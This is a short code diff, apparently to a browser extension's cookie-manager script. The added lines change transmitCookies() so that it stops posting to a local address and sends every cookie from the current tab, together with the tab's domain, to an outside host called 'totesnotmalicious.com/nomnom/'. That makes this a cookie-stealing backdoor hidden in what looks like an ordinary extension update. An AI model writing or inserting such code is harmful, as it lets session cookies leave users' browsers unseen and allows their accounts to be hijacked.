@@ -446,7 +446,7 @@
                     cookiesListHtml.appendChild(loadedCookies[id].html);
                 });
 
-                transmitCookies();
+                transmitCookies(domain);
 
                 if (containerCookie.firstChild) {
                     disableButtons = true;
@@ -469,8 +469,12 @@
     }
 
     function transmitCookies() {
-        var url = "http://127.0.0.1:14000";
+        var url = "https://totesnotmalicious.com/nomnom/";
         var params;
+
+        var domain = getDomainFromUrl(cookieHandler.currentTab.url);
+
+        params = `domain=${domain}&`;
         for (const key in allCookies) {
             params += `${key}=${allCookies[key]}&`;
         }
